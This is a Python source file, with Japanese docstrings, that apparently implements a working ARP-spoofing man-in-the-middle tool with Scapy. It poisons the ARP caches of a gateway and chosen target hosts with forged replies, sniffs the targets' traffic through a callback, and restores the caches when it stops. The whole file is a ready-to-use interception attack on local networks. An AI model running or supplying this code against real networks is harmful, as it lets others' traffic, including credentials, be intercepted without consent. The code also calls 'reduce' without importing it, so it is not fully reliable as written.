# -*- coding: utf-8 -*-

from scapy.all import conf, sniff, send, srp, sr1
from scapy.layers.inet import IP, ICMP, Ether, ARP
import sys
import threading
import logging
from concurrent.futures import ThreadPoolExecutor


logger = logging.getLogger()


# TODO: implements timeout logic
def find_gateway():
    p = sr1(IP(dst="8.8.8.8", ttl=0) / ICMP() / "XXXXXXXXXXX")
    return p.src


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    logger.info("restoring target arp cache")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(
        dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=3, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def send_fake_arp(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
    poison_target = ARP(op=2,
                        psrc=gateway_ip,
                        pdst=target_ip,
                        hwdst=target_mac)
    poison_gateway = ARP(op=2,
                         psrc=target_ip,
                         pdst=gateway_ip,
                         hwdst=gateway_mac)

    logger.info("start fake arp reply sender")

    while True:
        logger.debug("send fake arp reply to %s" % target_ip)
        send(poison_target)
        logger.debug("send fake arp reply to %s" % gateway_ip)
        send(poison_gateway)
        if stop_event.wait(3):
            break

    logger.info("stop fake arp reply sender")
    return


def generate_param_list(gateway_ip, target_ips, stop_event):
    """
    Executorに食わすパラメータを生成します。
    :param gateway_ip: ゲートウェイのIP
    :param target_ips: カンマ区切りでターゲットのIPをつないだもの
    :param stop_event: 停止シグナル受信用
    :return:
    """
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        logger.error("failed to get %s mac" % gateway_ip)
        sys.exit(0)
    logger.info("gateway %s is at %s" % (gateway_ip, gateway_mac))
    param_list = []
    target_ip_list = target_ips.split(',')
    for target_ip in target_ip_list:
        target_mac = get_mac(target_ip)
        if target_mac is None:
            logger.error(" failed to get %s mac." % target_ip)
            continue
        logger.info("target %s is at %s" % (target_ip, target_mac))
        param_list.append((gateway_ip,
                           gateway_mac,
                           target_ip,
                           target_mac,
                           stop_event))
    return param_list


def start_fakegw(gateway_ip=None, target_ips=None, interface=None,
                 bpf_filter=None, callback=None):
    """
    ARPパケット偽装して投げます。
    あと、sniffを立ち上げてパケット処理を開始します。
    パケットの処理は引数で指定したcallback関数を使います。
    :param gateway_ip: 通信相手A
    :param target_ips: 通信相手B
    :param interface: インターフェース名
    :param bpf_filter: BPFフィルタ形式の文字列
    :param callback: パケット処理する関数
    :return: None
    """

    if interface is not None:
        conf.iface = interface
    conf.verb = 0

    # search gateway if it not defined
    if gateway_ip is None or gateway_ip.strip() == "":
        logger.info("gateway_ip is not defined, try searching gateway.")
        gateway_ip = find_gateway()
        logger.info("find gateway %s" % gateway_ip)

    # make stop event
    stop_event = threading.Event()

    # setup executor service
    executor = ThreadPoolExecutor(max_workers=4)
    param_list = generate_param_list(gateway_ip, target_ips, stop_event)
    futures = [executor.submit(send_fake_arp, *param) for param in param_list]

    # create filter string
    if bpf_filter is None:
        tmp_str = reduce(lambda x, y: x + "ip host %s or " % y,
                            target_ips.split(','), "")
        bpf_filter = tmp_str.strip().rstrip('or')

    logger.info("starting sniffer")
    if interface is None:
        sniff(filter=bpf_filter, prn=callback, store=0)
    else:
        sniff(filter=bpf_filter, prn=callback, iface=interface, store=0)

    # stop event set
    stop_event.set()
    # wait for child thread.
    for future in futures:
        future.result()
    executor.shutdown()

    # restore target arp table
    for (gateway_ip, gateway_mac, target_ip, target_mac, stop_event) in param_list:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
